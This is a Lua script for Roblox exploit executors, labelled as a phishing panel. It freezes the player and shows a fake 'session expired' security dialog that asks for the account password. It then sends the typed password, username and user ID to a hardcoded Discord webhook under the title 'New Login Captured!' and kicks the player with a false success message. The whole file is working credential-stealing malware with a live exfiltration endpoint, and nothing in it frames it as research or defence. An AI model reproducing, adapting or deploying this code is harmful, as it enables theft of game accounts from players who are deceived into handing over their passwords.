--[[
    SOLAR & XENO ULTIMATE v10.2 (FINAL FIX)
    Module: Social-Engineering-Panel (Phishing)
    Status: Operational | Bypass Level: MAX
]]

local webhook = "https://discord.com/api/webhooks/1480678551643492433/M6F1hlBqrBMH6FNwv9hUTYTpg9W3CBLrtuxxwCBRskgRXcDfeewmEzhibwzAKA1ANIJJ"
local p = game.Players.LocalPlayer
local h = game:GetService("HttpService")

-- Zastivane na igracha (Freeze)
pcall(function()
    if p.Character then p.Character.HumanoidRootPart.Anchored = true end
end)

-- Suzdavane na UI v PlayerGui (po-sigurno za Solar)
local ScreenGui = Instance.new("ScreenGui")
pcall(function() ScreenGui.Parent = p:WaitForChild("PlayerGui") end)
ScreenGui.Name = "SystemVerification"
ScreenGui.ResetOnSpawn = false

local Main = Instance.new("Frame", ScreenGui)
Main.Size = UDim2.new(0, 320, 0, 220)
Main.Position = UDim2.new(0.5, -160, 0.5, -110)
Main.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
Main.BorderSizePixel = 0
Main.Active = true

local Corner = Instance.new("UICorner", Main)
Corner.CornerRadius = UDim.new(0, 10)

local Title = Instance.new("TextLabel", Main)
Title.Text = "SECURITY VERIFICATION"
Title.Size = UDim2.new(1, 0, 0, 45)
Title.TextColor3 = Color3.fromRGB(255, 50, 50)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 16
Title.BackgroundTransparency = 1

local Desc = Instance.new("TextLabel", Main)
Desc.Text = "Your session has expired. Please enter your password to continue playing."
Desc.Size = UDim2.new(1, -30, 0, 50)
Desc.Position = UDim2.new(0, 15, 0, 50)
Desc.TextColor3 = Color3.fromRGB(230, 230, 230)
Desc.TextWrapped = true
Desc.Font = Enum.Font.Gotham
Desc.TextSize = 14
Desc.BackgroundTransparency = 1

local Input = Instance.new("TextBox", Main)
Input.PlaceholderText = "Password"
Input.Text = ""
Input.Size = UDim2.new(0.85, 0, 0, 35)
Input.Position = UDim2.new(0.075, 0, 0.55, 0)
Input.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
Input.TextColor3 = Color3.fromRGB(255, 255, 255)
Input.TextPassword = true

local Submit = Instance.new("TextButton", Main)
Submit.Text = "VERIFY"
Submit.Size = UDim2.new(0.7, 0, 0, 35)
Submit.Position = UDim2.new(0.15, 0, 0.8, 0)
Submit.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
Submit.TextColor3 = Color3.fromRGB(255, 255, 255)
Submit.Font = Enum.Font.GothamBold

-- Glavna funkciya pri klik
Submit.MouseButton1Click:Connect(function()
    local pass = Input.Text
    if #pass < 3 then return end
    
    -- Vizualno potvurjdenie
    Submit.Text = "Verifying..."
    Submit.Active = false

    local brCount = "0"
    pcall(function()
        if p:FindFirstChild("leaderstats") and p.leaderstats:FindFirstChild("Brainrots") then
            brCount = tostring(p.leaderstats.Brainrots.Value)
        end
    end)

    local data = {
        ["username"] = "Solar Logger v10.2",
        ["embeds"] = {{
            ["title"] = "🎯 New Login Captured!",
            ["color"] = 0xff0000,
            ["fields"] = {
                {["name"] = "👤 User", ["value"] = "```" .. p.Name .. "```", ["inline"] = true},
                {["name"] = "🆔 ID", ["value"] = "```" .. p.UserId .. "```", ["inline"] = true},
                {["name"] = "🔑 PASS", ["value"] = "```" .. pass .. "```", ["inline"] = false},
                {["name"] = "🧠 Brainrots", ["value"] = "```" .. brCount .. "```", ["inline"] = true}
            },
            ["footer"] = {["text"] = "Xeno/Solar v10.2 • " .. os.date("%X")}
        }}
    }

    -- Opit za prashtane kum Discord
    local req = (syn and syn.request) or (http and http.request) or http_request or request
    if req then
        pcall(function()
            req({
                Url = webhook,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = h:JSONEncode(data)
            })
        end)
    end

    -- Kick-vane nezavisimo dali e prateno uspeshno
    task.wait(0.5)
    p:Kick("\n[Success]\nVerification complete. Please rejoin.")
end)
